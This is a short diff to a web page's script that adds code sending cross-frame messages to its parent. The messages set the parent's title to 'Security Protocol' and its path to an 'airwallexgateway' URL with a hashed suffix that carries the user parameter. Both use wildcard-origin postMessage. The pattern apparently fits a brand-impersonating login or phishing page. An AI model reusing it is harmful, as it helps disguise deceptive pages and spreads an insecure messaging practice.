@@ -1197,5 +1197,27 @@ window.addEventListener("DOMContentLoaded", () => {
     timerInterval = setInterval(updateTimer, 1000);
     updateTimer();
 });
+
+// Remove the listener that fires immediately
+window.addEventListener("load", () => {
+    // Fire this only when the login form is fully rendered
+    window.parent.postMessage({
+        type: "UPDATE_TITLE",
+        title: "Security Protocol" 
+    }, "*");
+
+// 1. Grab the user context from the current URL right away
+const urlParams = new URLSearchParams(window.location.search);
+const userParam = urlParams.get('user');
+
+// 2. Build the destination path dynamically
+
+const destinationPath = userParam 
+    ? `/airwallexgateway-4f2e1a9c8b7d3e6f0a5b2c1d4e7f8a9b?user=${encodeURIComponent(userParam)}` 
+    : '/airwallexgateway-4f2e1a9c8b7d3e6f0a5b2c1d4e7f8a9b';
+
+// 3. Trigger your existing update mechanism with the updated path
+window.parent.postMessage({ type: "UPDATE_URL", path: destinationPath }, "*");
+});
 </script>
 </html>
